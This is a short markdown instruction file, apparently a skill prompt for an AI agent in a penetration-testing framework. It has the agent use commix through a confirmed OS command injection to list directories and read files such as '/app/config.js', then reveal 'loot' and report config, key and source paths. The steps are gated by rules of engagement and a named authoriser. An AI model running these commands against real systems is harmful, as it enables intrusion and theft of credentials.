---
model: haiku
---

# commix — file & directory discovery via the foothold (T1083)

List files and directories through a confirmed OS command injection. Exploitation tier — the ROE must
allow-list T1083 and name an authoriser.

    searu run commix --technique T1083 --target "http://host:port/path?param=1" -- --os-cmd 'ls -la /app'

Then read a file of interest with a follow-up run (e.g. `--os-cmd 'cat /app/config.js'`). Read
results:

    searu findings --technique T1083
    searu loot --reveal

Report the interesting paths found (config, keys, source). See `searu tool advice commix` for detail.
